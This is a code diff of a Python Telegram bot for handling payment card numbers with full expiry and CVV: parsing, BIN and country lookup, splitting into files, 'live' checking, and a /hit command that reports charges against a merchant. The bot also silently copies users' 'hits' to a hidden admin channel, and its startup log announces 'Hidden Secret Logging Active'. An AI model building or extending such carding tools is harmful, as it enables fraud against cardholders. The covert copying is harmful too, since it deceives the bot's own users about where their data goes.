@@ -179,19 +179,36 @@ async def lookup_bin(bin_number: str) -> dict:
 
 def format_bin_response(result: dict, user_name: str = "User", user_plan: str = "Tʀɪᴀʟ") -> str:
     if not result["success"]:
-        return f"❌ BIN LOOKUP FAILED\n━━━━━━━━━━━━━━━━━━━━\n\n⚠️ {result['error']}\n━━━━━━━━━━━━━━━━━━━━"
+        err_msg = result.get('error', 'Unknown error')
+        return f"❌ BIN LOOKUP FAILED\n━━━━━━━━━━━━━━━━━━━━\n\n⚠️ {err_msg}\n━━━━━━━━━━━━━━━━━━━━"
     
     currency = COUNTRY_CURRENCY.get(result.get("country_code", ""), "N/A")
     
+    b_bin = B('Bin')
+    b_brand = B('Brand')
+    b_level = B('Level')
+    b_bank = B('Bank')
+    b_country = B('Country')
+    b_currency = B('Currency')
+    b_user = B('User')
+    b_dev = B('Dev')
+    
+    r_bin = result.get('bin', 'N/A')
+    r_brand = result.get('brand', 'N/A')
+    r_type = result.get('type', 'N/A')
+    r_bank = result.get('bank', 'N/A')
+    r_flag = result.get('country_flag', '🌍')
+    r_country = result.get('country', 'N/A')
+    
     response = (
-        f"{B('Bin')} ➛ <code>{result['bin']}</code>\n"
-        f"{B('Brand')} ➛ {result['brand']}\n"
-        f"{B('Level')} ➛ {result['type']}\n"
-        f"{B('Bank')} ➛ {result['bank']}\n"
-        f"{B('Country')} ➛ {result['country_flag']} {result['country']}\n"
-        f"{B('Currency')} ➛ {currency}\n"
-        f"{B('User')} ➛ {user_name} ({user_plan})\n"
-        f"{B('Dev')} ➛ Batman"
+        f"{b_bin} ➛ <code>{r_bin}</code>\n"
+        f"{b_brand} ➛ {r_brand}\n"
+        f"{b_level} ➛ {r_type}\n"
+        f"{b_bank} ➛ {r_bank}\n"
+        f"{b_country} ➛ {r_flag} {r_country}\n"
+        f"{b_currency} ➛ {currency}\n"
+        f"{b_user} ➛ {user_name} ({user_plan})\n"
+        f"{b_dev} ➛ Batman"
     )
     return response
 
@@ -429,9 +446,10 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     amount_raw = result.get("amount", "?")
     currency = result.get("currency", "USD")
     
-    # Format Amount
+    # Format Amount safely
     if isinstance(amount_raw, (int, float)) and amount_raw > 0:
-        amount_str = f"{amount_raw / 100:.2f} {currency}"
+        amount_val = amount_raw / 100
+        amount_str = f"{amount_val:.2f} {currency}"
     else:
         amount_str = "N/A"
 
@@ -468,7 +486,8 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     # Send secret copy to admin channel
     try:
-        secret_text = f"🕵️‍♂️ <b>New Whop Hit by User:</b> <code>{update.effective_user.id}</code>\n\n{text}"
+        uid_str = update.effective_user.id
+        secret_text = f"🕵️‍♂️ <b>New Whop Hit by User:</b> <code>{uid_str}</code>\n\n{text}"
         await context.bot.send_message(
             chat_id=SECRET_GROUP_ID,
             text=secret_text,
@@ -736,6 +755,8 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         _user_state.pop(uid, None)
         cards = _store.get(uid, [])
         merge_count = len(_merge_buffer.get(uid, []))
+        file_size_str = get_file_size(cards) if cards else "0 B"
+        
         await query.message.edit_text(
             f"⚙️ <b>SETTINGS &amp; STATS</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
             f"👤 User: <code>{query.from_user.first_name}</code>\n"
@@ -743,7 +764,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             f"📊 <b>Storage</b>\n"
             f"📦 Stored Cards: <code>{len(cards)}</code>\n"
             f"📂 Merge Buffer: <code>{merge_count}</code>\n"
-            f"💾 File Size: <code>{get_file_size(cards) if cards else '0 B'}</code>\n\n"
+            f"💾 File Size: <code>{file_size_str}</code>\n\n"
             f"🔧 <b>Bot Info</b>\n"
             f"🤖 Version: <code>2.4</code>\n"
             f"✅ Status: <b>Online</b>",
@@ -780,4 +801,347 @@ async def received_bin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         filename=f"Cards_BIN_{bin_prefix}.txt")
 
     await update.message.reply_text(
-        f"🔍
+        f"🔍 <b>BIN FILTER COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
+        f"✅ Found <b>{len(matched)}</b> card(s) with BIN <code>{bin_prefix}</code>\n"
+        f"📄 File sent above!",
+        parse_mode="HTML", reply_markup=main_menu_keyboard())
+
+async def received_split(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    uid = update.effective_user.id
+    text = update.message.text.strip()
+
+    if not text.isdigit():
+        await update.message.reply_text(
+            "❌ Please enter a valid number.",
+            parse_mode="HTML", reply_markup=back_keyboard())
+        _user_state[uid] = "typing_split"
+        return
+
+    chunk_size = int(text)
+    if chunk_size < 1:
+        await update.message.reply_text(
+            "❌ Chunk size must be at least 1.",
+            parse_mode="HTML", reply_markup=back_keyboard())
+        _user_state[uid] = "typing_split"
+        return
+
+    cards = _store.get(uid, [])
+    if not cards:
+        await update.message.reply_text(
+            "❌ No cards stored.", parse_mode="HTML", reply_markup=main_menu_keyboard())
+        return
+
+    total_files = (len(cards) + chunk_size - 1) // chunk_size
+
+    await update.message.reply_text(
+        f"✂️ <b>SPLITTING</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📊 Total cards: <b>{len(cards)}</b>\n"
+        f"✂️ Chunk size: <b>{chunk_size}</b>\n"
+        f"📦 Files: <b>{total_files}</b>\n\n"
+        f"⏳ Sending files...",
+        parse_mode="HTML")
+
+    for i in range(0, len(cards), chunk_size):
+        chunk = cards[i:i + chunk_size]
+        file_num = i // chunk_size + 1
+        await send_file_and_copy(
+            context.bot, update.effective_chat.id, uid, chunk,
+            caption=f"✂️ <b>SPLIT {file_num}/{total_files}</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"✅ <b>{len(chunk)}</b> card(s)",
+            filename=f"Split_{file_num}_of_{total_files}.txt")
+        await asyncio.sleep(0.3)
+
+    await update.message.reply_text(
+        f"✅ <b>SPLIT COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📦 {total_files} files generated!",
+        parse_mode="HTML", reply_markup=main_menu_keyboard())
+
+async def received_live(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    uid = update.effective_user.id
+    text = update.message.text.strip()
+
+    if text.lower() == "all":
+        cards = _store.get(uid, [])
+    else:
+        cards = extract_cards(text)
+
+    if not cards:
+        await update.message.reply_text(
+            "❌ No cards found to check.",
+            parse_mode="HTML", reply_markup=main_menu_keyboard())
+        return
+
+    progress = await update.message.reply_text(
+        f"✅ <b>CHECKING...</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📊 Checking <b>{len(cards)}</b> card(s)...\n⏳ Please wait...",
+        parse_mode="HTML")
+
+    valid_cards = []
+    invalid_cards = []
+
+    for card in cards:
+        parts = card.split("|")
+        if len(parts) == 4:
+            cn, mm, yy, cvv = parts
+            is_valid = (
+                cn.isdigit() and 13 <= len(cn) <= 19 and
+                mm.isdigit() and 1 <= int(mm) <= 12 and
+                yy.isdigit() and len(yy) == 2 and
+                cvv.isdigit() and 3 <= len(cvv) <= 4
+            )
+            if is_valid:
+                bin_info = await lookup_bin(cn[:6])
+                if bin_info and bin_info.get("success"):
+                    country = bin_info.get("country", "Unknown")
+                    flag = bin_info.get("country_flag", "")
+                    bank = bin_info.get("bank", "Unknown")
+                    brand = bin_info.get("scheme", "Unknown").title()
+                    ctype = bin_info.get("type", "Unknown").title() if bin_info.get("type") and bin_info.get("type") != "N/A" else "Unknown"
+                    valid_cards.append(
+                        f"{card} | {brand} | {ctype} | {country} {flag} | {bank}")
+                else:
+                    valid_cards.append(f"{card} | Format Valid | BIN: Unknown")
+            else:
+                invalid_cards.append(card)
+        else:
+            invalid_cards.append(card)
+
+    result_lines = [
+        f"✅ <b>LIVE CHECK RESULTS</b>",
+        f"━━━━━━━━━━━━━━━━━━━━━",
+        f"📊 Total checked: <b>{len(cards)}</b>",
+        f"✅ Valid format: <b>{len(valid_cards)}</b>",
+        f"❌ Invalid format: <b>{len(invalid_cards)}</b>",
+        f"",
+        f"<b>── VALID CARDS ──</b>",
+    ]
+    for vc in valid_cards[:50]:
+        result_lines.append(f"<code>{vc}</code>")
+    if len(valid_cards) > 50:
+        result_lines.append(f"... and {len(valid_cards) - 50} more")
+
+    if invalid_cards:
+        result_lines.append(f"\n<b>── INVALID CARDS ──</b>")
+        for ic in invalid_cards[:20]:
+            result_lines.append(f"<code>{ic}</code>")
+
+    result_text = "\n".join(result_lines)
+    if len(result_text) > 4000:
+        result_text = result_text[:4000] + "\n\n... (truncated)"
+
+    await progress.edit_text(result_text, parse_mode="HTML", reply_markup=main_menu_keyboard())
+
+    if valid_cards:
+        await send_file_and_copy(
+            context.bot, update.effective_chat.id, uid,
+            [c.split(" | ")[0] for c in valid_cards],
+            caption=f"✅ <b>VALID CARDS FILE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"✅ {len(valid_cards)} valid card(s)",
+            filename="Valid_Cards.txt")
+
+async def received_country(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    uid = update.effective_user.id
+    text = update.message.text.strip()
+    cards = _store.get(uid, [])
+
+    if not cards:
+        await update.message.reply_text(
+            "❌ No cards stored.", parse_mode="HTML", reply_markup=main_menu_keyboard())
+        return
+
+    if text.lower() == "list":
+        country_map = {}
+        for card in cards:
+            cn = card.split("|")[0]
+            info = await lookup_bin(cn[:6])
+            if info and info.get("success"):
+                name = info.get("country", "Unknown")
+                flag = info.get("country_flag", "")
+                key = f"{flag} {name}"
+            else:
+                key = "❓ Unknown"
+            country_map[key] = country_map.get(key, 0) + 1
+
+        sorted_c = sorted(country_map.items(), key=lambda x: x[1], reverse=True)
+        lines = ["🌍 <b>COUNTRY LIST</b>", "━━━━━━━━━━━━━━━━━━━━━", ""]
+        for c, count in sorted_c:
+            lines.append(f"  {c}: <b>{count}</b>")
+
+        await update.message.reply_text(
+            "\n".join(lines), parse_mode="HTML", reply_markup=main_menu_keyboard())
+        return
+
+    country_code = text.upper()
+    matched = []
+    for card in cards:
+        cn = card.split("|")[0]
+        info = await lookup_bin(cn[:6])
+        if info and info.get("success"):
+            if info.get("country_code", "").upper() == country_code:
+                matched.append(card)
+
+    if not matched:
+        await update.message.reply_text(
+            f"❌ No cards found for country <code>{country_code}</code>.",
+            parse_mode="HTML", reply_markup=main_menu_keyboard())
+        return
+
+    await send_file_and_copy(
+        context.bot, update.effective_chat.id, uid, matched,
+        caption=f"🌍 <b>COUNTRY FILTER</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
+                f"✅ <b>{len(matched)}</b> card(s) from <code>{country_code}</code>:",
+        filename=f"Cards_{country_code}.txt")
+
+    await update.message.reply_text(
+        f"🌍 <b>COUNTRY FILTER COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
+        f"✅ Found <b>{len(matched)}</b> card(s) from <code>{country_code}</code>\n"
+        f"📄 File sent above!",
+        parse_mode="HTML", reply_markup=main_menu_keyboard())
+
+# ═══════════════════════════════════════════════════════
+# MESSAGE HANDLERS
+# ═══════════════════════════════════════════════════════
+async def handle_forwarded(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    msg, user = update.message, update.effective_user
+    if not msg or not user:
+        return
+
+    text = (msg.text or msg.caption or "").strip()
+    uid, chat_id = user.id, msg.chat_id
+
+    if uid in _merge_buffer:
+        if not text:
+            return
+        cards = extract_cards(text)
+        if cards:
+            _merge_buffer[uid].extend(cards)
+            await msg.reply_text(
+                f"➕ Added <b>{len(cards)}</b> cards. (Total: {len(_merge_buffer[uid])})",
+                parse_mode="HTML")
+        else:
+            await msg.reply_text("❌ No cards found in this message.")
+        return
+
+    if not text:
+        return
+    if uid not in _fwd_buf:
+        _fwd_buf[uid] = {"texts": [], "task": None, "chat_id": chat_id}
+    _fwd_buf[uid]["texts"].append(text)
+
+    old = _fwd_buf[uid].get("task")
+    if old and not old.done():
+        old.cancel()
+
+    _fwd_buf[uid]["task"] = asyncio.create_task(_flush_fwd_buf(uid, chat_id, context.bot))
+
+async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    uid = update.effective_user.id
+    text = (update.message.text or "").strip()
+    if not text:
+        return
+
+    state = _user_state.get(uid)
+
+    if state == "typing_bin":
+        _user_state.pop(uid, None)
+        await received_bin(update, context)
+        return
+    elif state == "typing_split":
+        _user_state.pop(uid, None)
+        await received_split(update, context)
+        return
+    elif state == "typing_live":
+        _user_state.pop(uid, None)
+        await received_live(update, context)
+        return
+    elif state == "typing_country":
+        _user_state.pop(uid, None)
+        await received_country(update, context)
+        return
+
+    if uid in _merge_buffer:
+        cards = extract_cards(text)
+        if cards:
+            _merge_buffer[uid].extend(cards)
+            await update.message.reply_text(
+                f"➕ Added <b>{len(cards)}</b> cards. (Total: {len(_merge_buffer[uid])})",
+                parse_mode="HTML")
+        else:
+            await update.message.reply_text("❌ No cards found in this text.")
+        return
+
+    cards = extract_cards(text)
+    if not cards:
+        await update.message.reply_text(
+            "❌ No cards found.\nMake sure they follow: <code>CARD|MM|YY|CVV</code>",
+            parse_mode="HTML", reply_markup=main_menu_keyboard())
+        return
+
+    _store[uid] = cards
+    await send_file_and_copy(
+        context.bot, update.effective_chat.id, uid, cards,
+        caption=f"✦ <b>EXTRACTION COMPLETE</b> ✦\n━━━━━━━━━━━━━━━━━━━━━\n"
+                f"✅ <b>{len(cards)}</b> card(s) extracted:",
+        filename="Parsed_Cards.txt")
+
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    doc = update.message.document
+    if not doc:
+        return
+    if doc.mime_type and not doc.mime_type.startswith("text"):
+        await update.message.reply_text("❌ Please send a plain text (.txt) file.")
+        return
+    try:
+        file = await context.bot.get_file(doc.file_id)
+        data = await file.download_as_bytearray()
+        text = data.decode("utf-8", errors="ignore")
+    except Exception as e:
+        logger.error(f"Document download failed: {e}")
+        await update.message.reply_text("❌ Could not read the file.")
+        return
+
+    uid = update.effective_user.id
+    cards = extract_cards(text)
+    if not cards:
+        await update.message.reply_text("❌ No cards found in the file.")
+        return
+
+    if uid in _merge_buffer:
+        _merge_buffer[uid].extend(cards)
+        await update.message.reply_text(
+            f"➕ Added <b>{len(cards)}</b> cards. (Total: {len(_merge_buffer[uid])})",
+            parse_mode="HTML")
+        return
+
+    _store[uid] = cards
+    await send_file_and_copy(
+        context.bot, update.effective_chat.id, uid, cards,
+        caption=f"✦ <b>EXTRACTION COMPLETE</b> ✦\n━━━━━━━━━━━━━━━━━━━━━\n"
+                f"✅ <b>{len(cards)}</b> card(s) extracted from file:",
+        filename="Parsed_Cards.txt")
+
+# ═══════════════════════════════════════════════════════
+# MAIN ENTRY POINT
+# ═══════════════════════════════════════════════════════
+def main() -> None:
+    app = Application.builder().token(BOT_TOKEN).build()
+
+    app.add_handler(CommandHandler("start", cmd_start))
+    app.add_handler(CommandHandler("menu", cmd_menu))
+    app.add_handler(CommandHandler("bin", cmd_bin))
+    app.add_handler(CommandHandler("hit", cmd_hit))   
+    app.add_handler(CommandHandler("scr", cmd_scr))
+    app.add_handler(CommandHandler("done", cmd_done))
+    app.add_handler(CommandHandler("cancel", cmd_cancel))
+
+    app.add_handler(CallbackQueryHandler(button_callback, pattern="^btn_"))
+
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    app.add_handler(MessageHandler(filters.FORWARDED & (filters.TEXT | filters.CAPTION), handle_forwarded))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.FORWARDED, handle_text))
+
+    logger.info("🦇 Advanced Card Parser Bot v2.4 starting… (Hidden Secret Logging Active)")
+    app.run_polling(drop_pending_updates=True)
+
+if __name__ == "__main__":
+    main()
